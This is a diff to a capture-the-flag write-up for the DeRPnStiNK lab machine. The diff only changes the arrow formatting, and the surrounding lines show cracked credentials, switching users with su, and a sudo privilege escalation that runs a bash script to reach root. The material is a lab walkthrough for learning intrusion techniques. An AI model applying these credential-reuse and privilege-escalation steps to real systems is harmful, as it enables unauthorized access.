@@ -121,7 +121,7 @@ define('DB_USER', 'root');
 define('DB_PASSWORD', 'mysql');
 ```
 
-- `mysql -u root -p` => `mysql` 
+- `mysql -u root -p` <span class="fat-arrow">=></span> `mysql` 
 - `show databases;` 
 - `use mysql;` 
 - `show tables;` 
@@ -146,7 +146,7 @@ phpmyadmin = 4ACFE3202A5FF5CF467898FC58AAB1D615029441 = admin
 ```
 
 - Lets try `unclestinky : wedgie57` on user `stinky`. 
-- `su stinky` => `wedgie57` and it works. 
+- `su stinky` <span class="fat-arrow">=></span> `wedgie57` and it works. 
 - There is a `ftp` directory in `/stinky` and if we keep going in, there is a `key.txt` file which has `ssh` key for user `stinky` 
 
 ```
@@ -189,14 +189,14 @@ flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
 ```
 
 - We already have `stinky`'s or `unclestinky`'s password: `wedgie57` and now we also have `mrderp`'s password: `derpderpderpderpderpderpderp` 
-- `su mrderp` => `derpderpderpderpderpderpderp` and we are now logged in as `mrderp`! 
+- `su mrderp` <span class="fat-arrow">=></span> `derpderpderpderpderpderpderp` and we are now logged in as `mrderp`! 
 - `mrderp` : `derpderpderpderpderpderpderp` 
 
 ---
 
 ### Privilege Escalation
 
-- `sudo -l` => `derpderpderpderpderpderpderp`
+- `sudo -l` <span class="fat-arrow">=></span> `derpderpderpderpderpderpderp`
 
 ```
 User mrderp may run the following commands on DeRPnStiNK:
@@ -211,7 +211,7 @@ User mrderp may run the following commands on DeRPnStiNK:
 - `echo /bin/bash > derpy.sh` 
 - Then `chmod +x derpy.sh` and then execute it with: 
 `sudo ./derpy.sh` and we are now `root`! 
-- `whoami` => `root` 
+- `whoami` <span class="fat-arrow">=></span> `root` 
 - `cd /root/Desktop && ls -la` 
 - `cat flag.txt` 
 
